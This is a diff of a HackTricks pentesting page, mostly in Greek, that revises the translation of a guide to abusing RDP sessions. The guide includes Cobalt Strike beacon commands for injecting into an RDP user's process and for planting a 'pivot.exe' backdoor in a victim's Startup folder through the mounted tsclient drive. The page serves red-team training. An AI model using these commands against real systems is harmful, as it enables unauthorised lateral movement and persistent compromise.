@@ -1,24 +1,25 @@
-# Κατάχρηση Συνεδριών RDP
+# RDP Sessions Abuse
+
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον επαγγελματία με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-Άλλοι τρόποι για να υποστηρίξετε το HackTricks:
-
-* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
-* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
 
-## Εισαγωγή Διεργασίας RDP
+## RDP Process Injection
 
-Εάν η **εξωτερική ομάδα** έχει **πρόσβαση RDP** σε οποιοδήποτε **υπολογιστή** στον τρέχοντα τομέα, ένας **επιτιθέμενος** μπορεί να **παραβιάσει αυτόν τον υπολογιστή και να περιμένει**.
+Αν η **εξωτερική ομάδα** έχει **πρόσβαση RDP** σε οποιονδήποτε **υπολογιστή** στο τρέχον domain, ένας **επιτιθέμενος** θα μπορούσε να **παραβιάσει αυτόν τον υπολογιστή και να περιμένει αυτόν**.
 
-Μόλις ο χρήστης έχει πρόσβαση μέσω RDP, ο **επιτιθέμενος μπορεί να μεταβεί στη συνεδρία αυτού του χρήστη** και να καταχραστεί τα δικαιώματά του στον εξωτερικό τομέα.
+Μόλις ο χρήστης αποκτήσει πρόσβαση μέσω RDP, ο **επιτιθέμενος μπορεί να μεταπηδήσει στη συνεδρία αυτού του χρήστη** και να καταχραστεί τα δικαιώματά του στο εξωτερικό domain.
 ```powershell
 # Supposing the group "External Users" has RDP access in the current domain
 ## lets find where they could access
@@ -42,13 +43,13 @@ PID   PPID  Name                         Arch  Session     User
 beacon> inject 4960 x64 tcp-local
 ## From that beacon you can just run powerview modules interacting with the external domain as that user
 ```
-Ελέγξτε **άλλους τρόπους να κλέψετε συνεδρίες με άλλα εργαλεία** [**σε αυτήν τη σελίδα**](../../network-services-pentesting/pentesting-rdp.md#session-stealing)
+Ελέγξτε **άλλους τρόπους για να κλέψετε συνεδρίες με άλλα εργαλεία** [**σε αυτή τη σελίδα.**](../../network-services-pentesting/pentesting-rdp.md#session-stealing)
 
 ## RDPInception
 
-Εάν ένας χρήστης έχει πρόσβαση μέσω **RDP σε έναν υπολογιστή** όπου ένας **επιτιθέμενος** τον **περιμένει**, ο επιτιθέμενος θα μπορεί να **εισαγάγει έναν beacon στη συνεδρία RDP του χρήστη** και αν ο **θύματας έχει τοποθετήσει το δίσκο του** κατά την πρόσβασή του μέσω RDP, ο **επιτιθέμενος θα μπορούσε να τον προσπελάσει**.
+Εάν ένας χρήστης αποκτήσει πρόσβαση μέσω **RDP σε μια μηχανή** όπου ένας **επιτιθέμενος** **περιμένει** γι' αυτόν, ο επιτιθέμενος θα είναι σε θέση να **εισάγει ένα beacon στη συνεδρία RDP του χρήστη** και αν το **θύμα έχει συνδέσει τον δίσκο του** κατά την πρόσβαση μέσω RDP, ο **επιτιθέμενος θα μπορούσε να έχει πρόσβαση σε αυτόν**.
 
-Σε αυτήν την περίπτωση, μπορείτε απλά να **διακινδυνεύσετε** τον **αρχικό υπολογιστή του θύματος** γράφοντας ένα **backdoor** στον **φάκελο εκκίνησης**.
+Σε αυτή την περίπτωση, θα μπορούσατε απλώς να **συμβιβάσετε** τον **αρχικό υπολογιστή** του **θύματος** γράφοντας μια **πίσω πόρτα** στον **φάκελο εκκίνησης**.
 ```powershell
 # Wait til someone logs in:
 net logons
@@ -80,16 +81,17 @@ dir     10/18/2016 01:59:39   Documents and Settings
 beacon> cd \\tsclient\c\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
 beacon> upload C:\Payloads\pivot.exe
 ```
+{% hint style="success" %}
+Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Υποστήριξη HackTricks</summary>
 
-Άλλοι τρόποι για να υποστηρίξετε το HackTricks:
-
-* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
-* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.
+* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
+* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Μοιραστείτε κόλπα hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
